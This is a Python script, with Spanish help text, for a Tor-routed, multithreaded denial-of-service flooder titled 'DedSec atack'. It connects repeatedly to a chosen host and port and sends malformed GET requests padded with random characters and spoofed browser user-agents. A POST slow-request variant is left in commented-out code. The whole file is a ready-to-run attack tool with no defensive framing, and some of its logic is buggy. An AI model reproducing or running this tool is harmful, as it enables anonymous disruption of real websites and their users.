#!/usr/bin/python

from socks import socksocket, PROXY_TYPE_SOCKS5
from sys import argv, exit, stdout
from threading import Thread
from argparse import ArgumentParser
from platform import python_version
from random import choice, sample, uniform
from string import ascii_lowercase, ascii_uppercase, digits,printable
from time import sleep
from getpass import getpass

def _code():
	

	class _Color:
	
		def __init__(self):
		
			self.BLACK           =  "\033[30m"
			self.RED             =  "\033[31m"
			self.GREEN           =  "\033[32m"
			self.YELLOW          =  "\033[33m"
			self.BLUE            =  "\033[34m"
			self.MAGENTA         =  "\033[35m"
			self.CYAN            =  "\033[36m"
			self.WHITE           =  "\033[37m"
			self.RESET           =  "\033[39m"

			self.LIGHTBLACK_EX   =  "\033[90m"
			self.LIGHTRED_EX     =  "\033[91m"
			self.LIGHTGREEN_EX   =  "\033[92m"
			self.LIGHTYELLOW_EX  =  "\033[93m"
			self.LIGHTBLUE_EX    =  "\033[94m"
			self.LIGHTMAGENTA_EX =  "\033[95m"
			self.LIGHTCYAN_EX    =  "\033[96m"
			self.LIGHTWHITE_EX   =  "\033[97m"
		def PointGreen(self, color):
			return "{}[{}*{}] {}".format(self.LIGHTWHITE_EX, self.LIGHTGREEN_EX, self.LIGHTWHITE_EX, color)
		def PointRed(self, color):
			return "{}[{}*{}] {}".format(self.LIGHTWHITE_EX, self.LIGHTRED_EX, self.LIGHTWHITE_EX, color)

		def UP(self, n=1):
			return '\033[80;H\033[' + str(n) + 'A'
		def DOWN(self, n=1):
			return '\033[' + str(n) + 'B'
		def FORWARD(self, n=1):
			return '\033[' + str(n) + 'C'
		def BACK(self, n=1):
			return '\033[' + str(n) + 'D'
		def POS(self, x=1, y=1):
			return '\033[' + str(y) + ';' + str(x) + 'H'
		def SET_TITLE(self, text):
			return "\033]2;{}\007".format(text)
		def CLEAR(self):
			return "\033[3J\033[H\033[2J"    

	class _Main:
		
		def __init__(self):
			
			self._Color = _Color()
			self.useragents = [
 					"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
					"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
 					"Googlebot/2.1 (http://www.googlebot.com/bot.html)",
 					"Opera/9.20 (Windows NT 6.0; U; en)",
					"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
 					"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)",
 					"Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0",
					"Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16",
 					"Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)", 
 					"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13"
 					"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)",
 					"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
 					"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
 					"Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)",
 					"Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)",
 					"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8",
 					"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7",
 					"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
 					"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
					"YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)"
			]
			self.parar_ahora = False
			self.parse = ArgumentParser()
			self.parse.add_argument("-t", "--tor", help="Usar Tor en el ataque, por defecto activado")
			self.parse.add_argument("-ip", "--target", help="host o ip a atacar")
			self.parse.add_argument("-p", "--port", help="puerto a atacar")
			self.parse.add_argument("-th", "--threads", help="threads/hilos a usar en el ataque, por defecto 20")
			self.parse.add_argument("-c", "--chars", help="caracteres a enviar, por defecto 20")
			self.parse.add_argument("-peticion", "--peticion", help="peticones a usar: GET o POST, POST por defecto\nejemplo: python{} {} -ip www.google.com -p 80 -th 30 -peticion GET -t True".format(python_version()[0], argv[0]))
			self.parse.add_argument("-time", "--timeAtack", help="tiempo de duracion del ataque en segundosm tiempo por defecto: 45 segundos")
			self.parse.add_argument("-dir", "--directorio", help="atacar algun directorio en especial del servidor")
			self.parse = self.parse.parse_args()
			if self.parse.directorio == None:
				self.parse.directorio = ""
			if self.parse.chars == None:
				self.parse.chars = 20
			if self.parse.target == None or self.parse.port == None:
				print("{}Usted a de asignar un objetivo con -ip <ip obgetivo> y -p <puerto objetivo>".format(self._Color.PointRed(self._Color.LIGHTYELLOW_EX)))
				print("ejemplo: python{} {} -ip www.google.com -p 80".format(python_version()[0], argv[0]))
				exit()
			if self.parse.peticion == None or self.parse.peticion == "POST":
				#self.parse.peticion = "POST"
				self.parse.peticion = "GET"
				print(self._Color.PointRed("el modo POST ya no se admite"))
				'''self.peticion = ("POST / HTTP/1.1\r\n"
								"Host: "+str(self.parse.target)+"\r\n"
								"User-Agent: "+str(choice(self.useragents))+"\r\n"
								"Connection: keep-alive\r\n"
								"Keep-Alive: 1000\r\n"
								"Content-Length: 15000\r\n"
								"Content-Type: application/x-www-form-urlencoded\r\n")'''
			else:
				self.peticion = "GET"
			if self.parse.threads == None:
				self.parse.threads = 20

			if self.parse.tor == None or self.parse.tor ==  True:
				self.parse.tor = True
			else:
				self.parse.tor = False

			if self.parse.timeAtack == None:
				self.parse.timeAtack = 45
			elif self.parse.timeAtack != 0 and int(self.parse.timeAtack) > 0:
				self.parse.timeAtack = int(self.parse.timeAtack)
			else:
				self.parse.timeAtack = 45

			self.parse.threads = int(self.parse.threads)
			self.parse.chars = int(self.parse.chars)
			self.parse.port = int(self.parse.port)
			self.parse.peticion = str(self.parse.peticion)
			self._Color.CLEAR()
			print("{}--------------------------------------------------------------------------------------------------------------".format(self._Color.LIGHTYELLOW_EX))
			print("{}Comenzando ataque. congfiguraciones:\n{}ip:{}  puerto:{}  peticion:{}  threads/hilos:{}  tor:{}  chars:{}  time-atack:{}".format(self._Color.PointGreen(self._Color.GREEN), self._Color.PointGreen(self._Color.GREEN), self.parse.target, self.parse.port, self.parse.peticion, self.parse.threads, self.parse.tor, self.parse.chars, self.parse.timeAtack))
			print("{}--------------------------------------------------------------------------------------------------------------\n\n\n".format(self._Color.LIGHTYELLOW_EX))
			sleep(1)
			self.running = True
			self.PilaThreads = []
			self.asciiValue = (ascii_lowercase+ascii_uppercase+digits+printable+"\033[3J\033[H\033[2J\033]2;\007gay\033[90D\033[80;H\033[80A\033[5C\033[90D"+"'"+'"')*20
			self.numero_peticion = 0

		def KILL(self):
			self.parar_ahora
			for t in self.PilaThreads:
				t.parar_ahora = True
				t.running = False
				print("\nMatando hilo: {} {}\n".format(t, len(self.PilaThreads)))
				#print(t.is_alive())
				try:
					t.join()
				except RuntimeError:
					pass

				self.PilaThreads.remove(t)
				self.parse.timeAtack = -1
			exit(0)
			
		
		class PeticionHttp:
			
			def __init__(self, _main):
				self._Main = _main
				self.parse = self._Main.parse
				self._Color = _Color()
				self.socks = socksocket()
				self.asciiValue = self._Main.asciiValue

			def _envio_peticion_http(self):

				for i in range(0, 9999):
					try:
						if self._Main.parar_ahora == True:
							self.running = False
							break
					
						if self.parse.peticion == "GET":
							data = "".join(sample(self.asciiValue, self.parse.chars)*2)
							data = "GET /{1} HTTP/1.1 {0}\r\n".format(data, self._Main.parse.directorio)
							print ("{}Enviando atraves de GET numero peticion: {}".format(self._Color.UP(1)+self._Color.PointGreen(self._Color.GREEN), self._Main.numero_peticion))
						elif self.parse.peticion == "POST":
							data =  "".join(sample(self.asciiValue, self.parse.chars*2))
							data =  "POST /{} HTTP/1.1\r\n".format(self._Main.parse.directorio)+"Host: {}\r\n".format(self.parse.target)+"User-Agent: {}\r\n".format(choice(self.useragents))+"Connection: keep-alive\r\n"+"Keep-Alive: 5000\r\n"+"Content-Length: {}\r\n".format(9999999)+"Content-Type: application/x-www-form-urlencoded\r\n"+"{}".format(data)
							print(data)
							print ("{}Enviando atraves de POST numero peticion: {}".format(self._Color.UP(1)+self._Color.PointGreen(self._Color.GREEN), self._Main.numero_peticion))
						data = str(data)
						self.socks.send(data.encode())
						self._Main.numero_peticion += 1
					except:
						break
					
					#sleep(uniform(0.1, 1))
				
			def run(self):
				while self._Main.running:
					while self._Main.running:
						try:
							if self.parse.tor == True or self.parse.tor == None:
								self.socks.setproxy(PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)
								print("conectado a el proxi")
							
							self.socks.connect((self.parse.target, self.parse.port))
							stdout.flush()
							print("{}Conexion establecida con el host: {}:{}\n".format(self._Color.UP(1)+self._Color.PointGreen(self._Color.GREEN), self.parse.target, int(self.parse.port)))
							break
						except:
							self._Color.CLEAR()
							print("{}<Error-Conecion-to-host>Error de conexion con el host: {}:{}, pulse Ctrl + c{}".format(self._Color.UP(7)+self._Color.LIGHTRED_EX, self.parse.target, self.parse.port, self._Color.RESET))
							exit(1)
							self._Main.KILL()
							
					while self._Main.running:
						try:
							self._envio_peticion_http()
							self.socks.close()
							self.socks = socksocket()
							if self.parse.tor == True:
								self.socks.setproxy(PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)
							self.socks.connect((self.parse.target, self.parse.port))
						except KeyboardInterrupt:
							stdout.flush()
							print("{}Reiniciando el Thread/hilo".format(self._Color.PointGreen(self._Color.LIGHTYELLOW_EX)))
							self.socks = socksocket()
							break
					
		
		
		def _main(self):
			
			try:
				for i in range(self.parse.threads):
					if self.parar_ahora == False:
						PeticionHttp = Thread(target=self.PeticionHttp(self).run)
						PeticionHttp.setDaemon(False)
						self.PilaThreads.append(PeticionHttp)
						PeticionHttp.start()
						print("Todos los hilos fueron creados")
						if self.parse.timeAtack != -1:
							sleep(self.parse.timeAtack)
						print("\n\nTiempo establecido finalizado, parando ataque\n\r")
						self.KILL()
			except KeyboardInterrupt:
				print ("Matando los hilos\n\r")
				self.KILL()
				sleep(1000)
				exit()
				#self.PeticionHttp().run()
						
		
	return _Main()
if __name__ == "__main__":
	_Main = _code()
	print(_Main._Color.CLEAR())
	print(_Main._Color.SET_TITLE("*** DedSec atack ***"))
	_Main._main()
